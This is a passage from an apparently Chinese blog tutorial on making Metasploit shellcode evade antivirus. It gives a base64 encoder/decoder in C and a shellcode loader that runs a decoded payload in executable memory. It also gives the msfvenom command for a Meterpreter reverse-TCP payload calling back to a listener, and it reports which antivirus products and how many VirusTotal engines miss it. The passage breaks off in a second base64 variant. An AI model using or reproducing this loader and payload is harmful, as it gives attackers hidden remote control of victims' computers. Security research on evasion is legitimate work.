class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Base64 encoder/decoder. Originally Apache file ap_base64.c</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;base64.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* aaaack but it&#x27;s fast and const should make it shared text page. */</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> pr2six[<span class="number">256</span>] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* ASCII table */</span></span><br><span class="line">    <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>,</span><br><span class="line">    <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>,</span><br><span class="line">    <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">62</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">63</span>,</span><br><span class="line">    <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">56</span>, <span class="number">57</span>, <span class="number">58</span>, <span class="number">59</span>, <span class="number">60</span>, <span class="number">61</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>,</span><br><span class="line">    <span class="number">64</span>,  <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>,</span><br><span class="line">    <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>,</span><br><span class="line">    <span class="number">64</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">33</span>, <span class="number">34</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">37</span>, <span class="number">38</span>, <span class="number">39</span>, <span class="number">40</span>,</span><br><span class="line">    <span class="number">41</span>, <span class="number">42</span>, <span class="number">43</span>, <span class="number">44</span>, <span class="number">45</span>, <span class="number">46</span>, <span class="number">47</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>,</span><br><span class="line">    <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>,</span><br><span class="line">    <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>,</span><br><span class="line">    <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>,</span><br><span class="line">    <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>,</span><br><span class="line">    <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>,</span><br><span class="line">    <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>,</span><br><span class="line">    <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>,</span><br><span class="line">    <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span>, <span class="number">64</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Base64decode_len</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *bufcoded)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> nbytesdecoded;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *bufin;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">int</span> nprbytes;</span><br><span class="line"></span><br><span class="line">    bufin = (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *)bufcoded;</span><br><span class="line">    <span class="keyword">while</span> (pr2six[*(bufin++)] &lt;= <span class="number">63</span>);</span><br><span class="line"></span><br><span class="line">    nprbytes = (bufin - (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *)bufcoded) - <span class="number">1</span>;</span><br><span class="line">    nbytesdecoded = ((nprbytes + <span class="number">3</span>) / <span class="number">4</span>) * <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> nbytesdecoded + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Base64decode</span><span class="params">(<span class="type">char</span> *bufplain, <span class="type">const</span> <span class="type">char</span> *bufcoded)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> nbytesdecoded;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *bufin;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">unsigned</span> <span class="type">char</span> *bufout;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">int</span> nprbytes;</span><br><span class="line"></span><br><span class="line">    bufin = (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *)bufcoded;</span><br><span class="line">    <span class="keyword">while</span> (pr2six[*(bufin++)] &lt;= <span class="number">63</span>);</span><br><span class="line">    nprbytes = (bufin - (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *)bufcoded) - <span class="number">1</span>;</span><br><span class="line">    nbytesdecoded = ((nprbytes + <span class="number">3</span>) / <span class="number">4</span>) * <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    bufout = (<span class="type">unsigned</span> <span class="type">char</span> *)bufplain;</span><br><span class="line">    bufin = (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *)bufcoded;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (nprbytes &gt; <span class="number">4</span>) &#123;</span><br><span class="line">        *(bufout++) =</span><br><span class="line">            (<span class="type">unsigned</span> <span class="type">char</span>)(pr2six[*bufin] &lt;&lt; <span class="number">2</span> | pr2six[bufin[<span class="number">1</span>]] &gt;&gt; <span class="number">4</span>);</span><br><span class="line">        *(bufout++) =</span><br><span class="line">            (<span class="type">unsigned</span> <span class="type">char</span>)(pr2six[bufin[<span class="number">1</span>]] &lt;&lt; <span class="number">4</span> | pr2six[bufin[<span class="number">2</span>]] &gt;&gt; <span class="number">2</span>);</span><br><span class="line">        *(bufout++) =</span><br><span class="line">            (<span class="type">unsigned</span> <span class="type">char</span>)(pr2six[bufin[<span class="number">2</span>]] &lt;&lt; <span class="number">6</span> | pr2six[bufin[<span class="number">3</span>]]);</span><br><span class="line">        bufin += <span class="number">4</span>;</span><br><span class="line">        nprbytes -= <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Note: (nprbytes == 1) would be an error, so just ingore that case */</span></span><br><span class="line">    <span class="keyword">if</span> (nprbytes &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        *(bufout++) =</span><br><span class="line">            (<span class="type">unsigned</span> <span class="type">char</span>)(pr2six[*bufin] &lt;&lt; <span class="number">2</span> | pr2six[bufin[<span class="number">1</span>]] &gt;&gt; <span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (nprbytes &gt; <span class="number">2</span>) &#123;</span><br><span class="line">        *(bufout++) =</span><br><span class="line">            (<span class="type">unsigned</span> <span class="type">char</span>)(pr2six[bufin[<span class="number">1</span>]] &lt;&lt; <span class="number">4</span> | pr2six[bufin[<span class="number">2</span>]] &gt;&gt; <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (nprbytes &gt; <span class="number">3</span>) &#123;</span><br><span class="line">        *(bufout++) =</span><br><span class="line">            (<span class="type">unsigned</span> <span class="type">char</span>)(pr2six[bufin[<span class="number">2</span>]] &lt;&lt; <span class="number">6</span> | pr2six[bufin[<span class="number">3</span>]]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *(bufout++) = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    nbytesdecoded -= (<span class="number">4</span> - nprbytes) &amp; <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">return</span> nbytesdecoded;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span> basis_64[] =</span><br><span class="line"><span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Base64encode_len</span><span class="params">(<span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> ((len + <span class="number">2</span>) / <span class="number">3</span> * <span class="number">4</span>) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Base64encode</span><span class="params">(<span class="type">char</span> *encoded, <span class="type">const</span> <span class="type">char</span> *<span class="built_in">string</span>, <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">char</span> *p;</span><br><span class="line"></span><br><span class="line">    p = encoded;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len - <span class="number">2</span>; i += <span class="number">3</span>) &#123;</span><br><span class="line">        *p++ = basis_64[(<span class="built_in">string</span>[i] &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">        *p++ = basis_64[((<span class="built_in">string</span>[i] &amp; <span class="number">0x3</span>) &lt;&lt; <span class="number">4</span>) |</span><br><span class="line">            ((<span class="type">int</span>)(<span class="built_in">string</span>[i + <span class="number">1</span>] &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>)];</span><br><span class="line">        *p++ = basis_64[((<span class="built_in">string</span>[i + <span class="number">1</span>] &amp; <span class="number">0xF</span>) &lt;&lt; <span class="number">2</span>) |</span><br><span class="line">            ((<span class="type">int</span>)(<span class="built_in">string</span>[i + <span class="number">2</span>] &amp; <span class="number">0xC0</span>) &gt;&gt; <span class="number">6</span>)];</span><br><span class="line">        *p++ = basis_64[<span class="built_in">string</span>[i + <span class="number">2</span>] &amp; <span class="number">0x3F</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; len) &#123;</span><br><span class="line">        *p++ = basis_64[(<span class="built_in">string</span>[i] &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">        <span class="keyword">if</span> (i == (len - <span class="number">1</span>)) &#123;</span><br><span class="line">            *p++ = basis_64[((<span class="built_in">string</span>[i] &amp; <span class="number">0x3</span>) &lt;&lt; <span class="number">4</span>)];</span><br><span class="line">            <span class="comment">//    *p++ = &#x27;=&#x27;;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            *p++ = basis_64[((<span class="built_in">string</span>[i] &amp; <span class="number">0x3</span>) &lt;&lt; <span class="number">4</span>) |</span><br><span class="line">                ((<span class="type">int</span>)(<span class="built_in">string</span>[i + <span class="number">1</span>] &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>)];</span><br><span class="line">            *p++ = basis_64[((<span class="built_in">string</span>[i + <span class="number">1</span>] &amp; <span class="number">0xF</span>) &lt;&lt; <span class="number">2</span>)];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//*p++ = &#x27;=&#x27;;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *p++ = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> p - encoded;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>base64.h</code>文件内容：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _BASE64_H_</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _BASE64_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">Base64encode_len</span><span class="params">(<span class="type">int</span> len)</span>;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">Base64encode</span><span class="params">(<span class="type">char</span> * coded_dst, <span class="type">const</span> <span class="type">char</span> *plain_src, <span class="type">int</span> len_plain_src)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">Base64decode_len</span><span class="params">(<span class="type">const</span> <span class="type">char</span> * coded_src)</span>;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">Base64decode</span><span class="params">(<span class="type">char</span> * plain_dst, <span class="type">const</span> <span class="type">char</span> *coded_src)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">//_BASE64_H_</span></span></span><br></pre></td></tr></table></figure><p><code>shellcode.c</code>文件内容：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;base64.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] =</span><br><span class="line"><span class="string">&quot;msf base64 code here&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 原po代码报错，这里做了一些强制转换和类型修正</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> str1[<span class="number">1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    Base64decode(str1, (<span class="type">char</span>*)buf);</span><br><span class="line">    LPVOID Memory;</span><br><span class="line">    Memory = VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(str1), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(Memory, str1, <span class="keyword">sizeof</span>(str1));</span><br><span class="line">    ((<span class="type">void</span>(*)())Memory)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用msf生成base64编码的shellcode：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p  windows/meterpreter/reverse_tcp --encrypt base64  lhost=192.168.174.128 lport=6666  -f c &gt; shell.c</span><br></pre></td></tr></table></figure><p>把<code>shell.c</code>的内容复制到上面<code>shellcode.c</code>文件中。vs2019编译，关闭杀软，msf可成功上线。</p><p>打开杀软，火绒可以查杀，<strong>360不能查杀</strong>（原po火绒静态查杀会报毒，但行为检测没有反应，360全通过）。</p><p>virustotal.com查杀率为21&#x2F;68（原po为28&#x2F;69）。</p><p><img src="/./images/202205301526558.png" alt="image-20220530152630449"></p><h3 id="方法8-base64加密2（VT免杀率17-67）"><a href="#方法8-base64加密2（VT免杀率17-67）" class="headerlink" title="方法8 base64加密2（VT免杀率17&#x2F;67）"></a>方法8 base64加密2（VT免杀率17&#x2F;67）</h3><p>另外一种base64加密方式，和方法7类似，实现代码略有不同。</p><p><code>base64.c</code>文件内容：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  base64.c</span></span><br><span class="line"><span class="comment">//  base64</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  Created by guofu on 2017/5/25.</span></span><br><span class="line"><span class="comment">//  Copyright © 2017年 guofu. All rights reserved.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*  转解码过程</span></span><br><span class="line"><span class="comment">*  3 * 8 = 4 * 6; 3字节占24位, 4*6=24</span></span><br><span class="line"><span class="comment">*  先将要编码的转成对应的ASCII值</span></span><br><span class="line"><span class="comment">*  如编码: s 1 3</span></span><br><span class="line"><span class="comment">*  对应ASCII值为: 115 49 51</span></span><br><span class="line"><span class="comment">*  对应二进制为: 01110011 00110001 00110011</span></span><br><span class="line"><span class="comment">*  将其6个分组分4组: 011100 110011 000100 110011</span></span><br><span class="line"><span class="comment">*  而计算机是以8bit存储, 所以在每组的高位补两个0如下:</span></span><br><span class="line"><span class="comment">*  00011100 00110011 00000100 00110011对应:28 51 4 51</span></span><br><span class="line"><span class="comment">*  查找base64 转换表 对应 c z E z</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*  解码</span></span><br><span class="line"><span class="comment">*  c z E z</span></span><br><span class="line"><span class="comment">*  对应ASCII值为 99 122 69 122</span></span><br><span class="line"><span class="comment">*  对应表base64_suffix_map的值为 28 51 4 51</span></span><br><span class="line"><span class="comment">*  对应二进制值为 00011100 00110011 00000100 00110011</span></span><br><span class="line"><span class="comment">*  依次去除每组的前两位, 再拼接成3字节</span></span><br><span class="line"><span class="comment">*  即: 01110011 00110001 00110011</span></span><br><span class="line"><span class="comment">*  对应的就是s 1 3</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;base64.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// base64 转换表, 共64个</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span> base64_alphabet[] = &#123;</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>,</span><br><span class="line">    <span 